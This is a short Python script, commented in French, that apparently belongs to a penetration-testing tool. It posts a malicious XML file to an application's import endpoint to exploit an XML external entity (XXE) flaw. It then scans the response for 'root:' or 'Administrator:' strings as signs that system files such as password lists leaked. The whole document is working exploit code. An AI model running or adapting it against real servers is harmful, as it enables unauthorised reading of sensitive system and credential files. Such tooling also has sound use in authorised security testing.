import requests

def exploit_xxe(url, file_path, callback=None):
    """
    Envoie un fichier XML malveillant à l'application pour exploiter la vulnérabilité XXE.
    
    :param url: URL de l'endpoint d'import ou similaire (ex. http://localhost:3000/api/import)
    :param file_path: chemin vers le fichier XML malveillant (XXE_payload.xml)
    """
    try:
        with open(file_path, 'rb') as f:
            files = {'file': ('XXE_payload.xml', f, 'application/xml')}
            r = requests.post(url, files=files)

        callback(f"Request status: {r.status_code}")
        callback("[*] Contenu de la réponse :")
        callback(r.text)

        if "root:" in r.text or "Administrator:" in r.text:
            callback("[+] XXE potentiellement réussie ! Du contenu sensible a été renvoyé.")
        else:
            callback("[-] Pas de contenu sensible détecté.")
    except FileNotFoundError:
        callback("[!] Fichier XML introuvable. Vérifiez le chemin.")
    except requests.RequestException as e:
        callback(f"[!] Erreur lors de la requête : {e}")
